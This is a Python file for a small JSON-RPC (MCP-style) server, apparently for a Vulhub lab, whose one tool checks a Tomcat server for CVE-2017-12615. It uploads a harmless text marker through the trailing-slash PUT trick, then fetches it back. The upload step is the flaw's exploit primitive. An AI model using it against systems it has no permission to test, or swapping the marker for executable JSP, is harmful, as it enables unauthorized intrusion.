from __future__ import annotations

import json
import uuid
import urllib.request
import urllib.error
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urljoin


def tomcat_cve_2017_12615_probe(target_url: str) -> dict:
    marker = "aegra-real-mcp-marker-" + uuid.uuid4().hex[:8]
    put_url = urljoin(target_url, marker + ".jsp/")
    get_url = urljoin(target_url, marker + ".jsp")

    result = {
        "success": True,
        "target_url": target_url,
        "put_url": put_url,
        "get_url": get_url,
        "marker": marker,
        "validated": False,
        "confidence": 0.0,
        "summary": "",
        "steps": [],
        "parsed": {
            "entities": [],
            "relations": [],
            "findings": [],
            "runtime_hints": {},
            "writeback_hints": {},
        },
    }

    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))

    try:
        req = urllib.request.Request(target_url, method="OPTIONS")
        with opener.open(req, timeout=5) as r:
            result["steps"].append({
                "step": "OPTIONS",
                "status": r.status,
                "allow": r.headers.get("Allow", ""),
            })
    except Exception as e:
        result["steps"].append({"step": "OPTIONS", "error": str(e)})

    try:
        req = urllib.request.Request(put_url, data=marker.encode(), method="PUT")
        with opener.open(req, timeout=5) as r:
            result["steps"].append({"step": "PUT_STATIC_MARKER", "status": r.status})
    except urllib.error.HTTPError as e:
        result["steps"].append({"step": "PUT_STATIC_MARKER", "status": e.code, "error": str(e)})
    except Exception as e:
        result["steps"].append({"step": "PUT_STATIC_MARKER", "error": str(e)})

    try:
        with opener.open(get_url, timeout=5) as r:
            body = r.read(512).decode("utf-8", "ignore")
            matched = marker in body
            result["steps"].append({"step": "GET_MARKER", "status": r.status, "matched": matched})
            result["validated"] = matched
            result["confidence"] = 0.92 if matched else 0.35
    except urllib.error.HTTPError as e:
        result["steps"].append({"step": "GET_MARKER", "status": e.code, "error": str(e)})
        result["confidence"] = 0.2
    except Exception as e:
        result["steps"].append({"step": "GET_MARKER", "error": str(e)})
        result["confidence"] = 0.0

    if result["validated"]:
        result["summary"] = "CVE-2017-12615 validated by safe static marker upload and retrieval"
        result["parsed"]["findings"].append({
            "id": "vuln::CVE-2017-12615::svc-vulhub-tomcat-8081",
            "type": "Vulnerability",
            "cve": "CVE-2017-12615",
            "service_id": "svc-vulhub-tomcat-8081",
            "validation_status": "validated",
            "confidence": result["confidence"],
            "summary": result["summary"],
        })
        result["parsed"]["runtime_hints"] = {
            "validated": True,
            "confidence": result["confidence"],
        }
    else:
        result["summary"] = "CVE-2017-12615 not validated by safe marker retrieval"

    return result


class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0"))
        payload = json.loads(self.rfile.read(length).decode("utf-8"))

        method = payload.get("method")
        request_id = payload.get("id")

        if method == "tools/list":
            response = {
                "jsonrpc": "2.0",
                "id": request_id,
                "result": {
                    "tools": [
                        {
                            "name": "vuln.tomcat_cve_2017_12615_probe",
                            "description": "Safe static marker validation for Tomcat CVE-2017-12615. No command execution.",
                            "inputSchema": {
                                "type": "object",
                                "properties": {
                                    "target_url": {"type": "string"},
                                    "mode": {"type": "string"},
                                },
                                "required": ["target_url"],
                            },
                        }
                    ]
                },
            }
        elif method == "tools/call":
            params = payload.get("params") or {}
            name = params.get("name")
            args = params.get("arguments") or {}

            if name != "vuln.tomcat_cve_2017_12615_probe":
                response = {
                    "jsonrpc": "2.0",
                    "id": request_id,
                    "error": {"code": -32601, "message": f"unknown tool {name}"},
                }
            else:
                result = tomcat_cve_2017_12615_probe(args["target_url"])
                response = {
                    "jsonrpc": "2.0",
                    "id": request_id,
                    "result": {
                        "structuredContent": result,
                        "isError": False,
                    },
                }
        else:
            response = {
                "jsonrpc": "2.0",
                "id": request_id,
                "error": {"code": -32601, "message": f"unknown method {method}"},
            }

        body = json.dumps(response, ensure_ascii=False).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt, *args):
        return


if __name__ == "__main__":
    server = ThreadingHTTPServer(("0.0.0.0", 8765), Handler)
    print("MCP Vulhub lab server listening on 0.0.0.0:8765", flush=True)
    server.serve_forever()